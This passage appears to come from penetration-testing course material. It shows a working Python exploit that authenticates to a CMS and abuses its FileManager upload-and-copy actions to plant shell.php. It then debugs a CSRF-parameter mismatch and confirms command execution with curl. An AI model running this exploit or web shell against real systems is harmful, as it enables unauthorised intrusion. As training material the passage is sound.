### Optimized Text

#### PHP Filename and Payload
```python
php_filename = 'shell.php'
payload = ""
```

#### CSRF Token Parsing Function
```python
def parse_csrf_token(location):
    return location.split(csrf_param + "=")[1]
```

#### Authentication Function
```python
def authenticate():
    page = "/login.php"
    url = base_url + page
    data = {
        "username": username,
        "password": password,
        "loginsubmit": "Submit"
    }
    response = requests.post(url, data=data, allow_redirects=False, verify=False)
    status_code = response.status_code
    if status_code == 302:
        print("[+] Authenticated successfully with the supplied credentials")
        return response.cookies, parse_csrf_token(response.headers['Location'])
    else:
        print("[-] Authentication failed")
        return None, None
```

#### Upload TXT File Function
```python
def upload_txt(cookies, csrf_token):
    mact = "FileManager,m1_,upload,0"
    page = "/moduleinterface.php"
    url = base_url + page
    data = {
        "mact": mact,
        csrf_param: csrf_token,
        "disable_buffer": 1
    }
    txt = {
        'm1_files[]': (txt_filename, payload)
    }
    print(f"[*] Attempting to upload {txt_filename}...")
    response = requests.post(url, data=data, files=txt, cookies=cookies, verify=False)
    status_code = response.status_code
    if status_code == 200:
        print(f"[+] Successfully uploaded {txt_filename}")
        return True
    else:
        print(f"[-] An error occurred while uploading {txt_filename}")
        return False
```

#### Copy to PHP Function
```python
def copy_to_php(cookies, csrf_token):
    mact = "FileManager,m1_,fileaction,n0"
    page = "/moduleinterface.php"
    url = base_url + page
    b64 = base64.b64encode(txt_filename.encode())
    serialized = f'a:1:{{i:0;s:{len(b64)}:"{b64.decode()}";}}'
    data = {
        "mact": mact,
        csrf_param: csrf_token,
        "m1_fileactioncopy": "",
        "m1_path": upload_dir,
        "m1_selall": serialized,
        "m1_destdir": "/",
        "m1_destname": php_filename,
        "m1_submit": "Copy"
    }
    print(f"[*] Attempting to copy {txt_filename} to {php_filename}...")
    response = requests.post(url, data=data, cookies=cookies, allow_redirects=False, verify=False)
    status_code = response.status_code
    if status_code == 302 and response.headers['Location'].endswith('copysuccess'):
        print("[+] File copied successfully")
        return True
    else:
        print(f"[-] An error occurred while copying, maybe {php_filename} already exists")
        return False
```

#### Quit Function
```python
def quit():
    print("[-] Exploit failed")
    exit()
```

#### Run Function
```python
def run():
    cookies, csrf_token = authenticate()
    if not cookies:
        quit()
    if not upload_txt(cookies, csrf_token):
        quit()
    if not copy_to_php(cookies, csrf_token):
        quit()
    print(f"[+] Exploit succeeded, shell can be found at: {upload_url}/{php_filename}")

run()
```

### Troubleshooting the "Index Out of Range" Error

An exception was triggered during the execution of the `parse_csrf_token` function on line 24 of the code. The error indicates that the code tried to access a non-existent element of a Python list via its second element (`location.split(csrf_param + "=")[1]`).

To better understand the `IndexError`, we can add a print statement in the `parse_csrf_token` function before the return instruction:

```python
def parse_csrf_token(location):
    print(f"[+] String that is being split: {location}")
    return location.split(csrf_param + "=")[1]
```

The exploit now displays the full string before the `split` method is invoked.

```bash
kali@kali:~$ python2 44976_modified.py
/usr/lib/python2.7/dist-packages/urllib3/connectionpool.py:849: InsecureRequestWarning: Unverified HTTPS request is being made. Adding certificate verification is strongly advised. See:
https://urllib3.readthedocs.io/en/latest/advanced-usage.html#ssl-warnings
InsecureRequestWarning)
[+] Authenticated successfully with the supplied credentials
[+] String that is being split: https://10.11.0.128/admin?_sk_=f2946ad9afceb247864
Traceback (most recent call last):
File "44976_modified.py", line 104, in <module>
run()
File "44976_modified.py", line 95, in run
cookies,csrf_token = authenticate()
File "44976_modified.py", line 39, in authenticate
return response.cookies, parse_csrf_token(response.headers['Location'])
File "44976_modified.py", line 25, in parse_csrf_token
return location.split(csrf_param + "=")[1]
IndexError: list index out of range
```

While the exploit code expected the input string to contain `__c` (defined in the `csrf_param` variable), we received `_sk_` from the web application. This suggests a version or configuration mismatch. To resolve this, we change the `csrf_param` variable to match the CMS response:

```python
csrf_param = "_sk_"
```

Now, we execute the modified exploit:

```bash
kali@kali:~$ python2 44976_modified.py
/usr/lib/python2.7/dist-packages/urllib3/connectionpool.py:849: InsecureRequestWarning: Unverified HTTPS request is being made. Adding certificate verification is strongly advised. See:
https://urllib3.readthedocs.io/en/latest/advanced-usage.html#ssl-warnings
InsecureRequestWarning)
[+] Authenticated successfully with the supplied credentials
[+] String that is being split: https://192.168.50.45/admin?_sk_=bdc51a781fe6edcc126
[*] Attempting to upload cmsmsrce.txt...
...
[+] Successfully uploaded cmsmsrce.txt
[*] Attempting to copy cmsmsrce.txt to shell.php...
...
[+] File copied successfully
[+] Exploit succeeded, shell can be found at: https://192.168.50.45/uploads/shell.php
```

The error is no longer displayed, and the exploit has succeeded. We can validate the exploit by attaching to the PHP shell with a tool like `curl` and supplying a system command to serve as the payload:

```bash
kali@kali:~$ curl -k https://192.168.50.45/uploads/shell.php?cmd=whoami
www-data
```

### Wrapping Up

In this module, we covered the main segments of a plain stack-based buffer overflow that required extensive editing to match our target environment. We then cross-compiled the code to make it run on our Kali attack platform. We also modified a web exploit to demonstrate how these types of exploits can be repurposed for a different target environment. These scenarios reveal solutions to common obstacles encountered when dealing with public exploits during an engagement.

### Locating Public Exploits

#### Learning Units
- Getting Started with Public Exploits
- Online Exploit Resources
- Offline Exploit Resources
- Exploiting a Target

An exploit is a program or script that can leverage a flaw or vulnerability of a target system. Exploits can have a range of effects, such as a denial of service (DoS), remote code execution (RCE), or a privilege escalation (privesc).

A common process in penetration testing is the use of publicly available exploits, and searching for appropriate exploits becomes a critical skill. In this module, we will focus on various online resources that host exploits for publicly known vulnerabilities. We will also inspect offline tools available in Kali that contain locally-hosted exploits. With the knowledge to find public exploits, we will narrow our search to relevant ones that could be used to gain access to a machine. At the end of this module, we will enumerate a target to determine which exploit(s) can be used to compromise it.

#### A Word of Caution

It is important to understand the risks associated with executing unknown exploits, especially if we donâ€™t analyze what the exploit code does. For example, the 0pen0wn exploit, published as a remote exploit for SSH, asks for "root" privileges, which is suspicious:

```c
if (geteuid()) {
    puts("Root is required for raw sockets, etc.");
    return 1;
}
```

Always carefully read and understand the code before execution to ensure no negative effects.